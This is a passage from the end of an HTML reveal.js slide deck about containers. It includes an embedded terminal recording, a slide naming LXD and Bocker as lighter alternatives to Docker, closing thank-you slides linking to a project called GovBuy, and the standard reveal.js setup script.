            <a style="font-size: small;" href="https://asciinema.org/a/85811">[1]</a>
            <script type="text/javascript" src="https://asciinema.org/a/85811.js" id="asciicast-85811" data-preload="1" async></script>
          </section>
        </section>
        <section>
          <section data-markdown>
            <script type="text/template">
              ## Simplier Containers?

              - LXD (_lex_dee_)
              - [Bocker](https://github.com/p8952/bocker)
                <br />Docker in around 100 lines of bash
              - [... and others](https://www.flockport.com/sleepwalking-into-a-monoculture-lock-in-with-linux-containers/)
            </script>
          </section>
        </section>

        <section>
          <section data-markdown>
            <script type="text/template">
              ## Thank you!
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ![GovBuy](images/govbuy_lightblur.svg)

              - [bit.ly/govBuy](http://bit.ly/govBuy)
              - [bit.ly/what_is_govbuy](http://bit.ly/simi_gbuy)
            </script>
          </section>
        </section>
			</div>
		</div>

		<script src="lib/js/head.min.js"></script>
		<script src="js/reveal.js"></script>

		<script>
			// More info https://github.com/hakimel/reveal.js#configuration
			Reveal.initialize({
				history: true,

				// More info https://github.com/hakimel/reveal.js#dependencies
				dependencies: [
					{ src: 'plugin/markdown/marked.js' },
					{ src: 'plugin/markdown/markdown.js' },
					{ src: 'plugin/notes/notes.js', async: true },
					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
				]
			});
		</script>
	</body>
</html>
